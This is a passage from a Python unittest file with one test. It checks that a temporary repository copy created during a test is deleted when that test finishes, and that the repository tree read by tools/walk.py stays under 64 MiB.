    def test_a_copy_of_the_repo_is_removed_when_the_test_that_made_it_ends(self):  # issue 344
        made = []

        class Case(unittest.TestCase):
            def test_it(self):
                made.append(clone({"x.txt": "x"}))
                self.assertTrue((made[0] / "x.txt").is_file())
        result = unittest.TestResult()
        Case("test_it").run(result)
        self.assertTrue(result.wasSuccessful(), result.failures + result.errors)
        self.assertFalse(made[0].parent.exists())
        # A copy is the tree as tools/walk.py reads it: no other working tree, and megabytes.
        self.assertLess(sum(f.stat().st_size for f in walk.files(ROOT)), 64 * 2 ** 20)
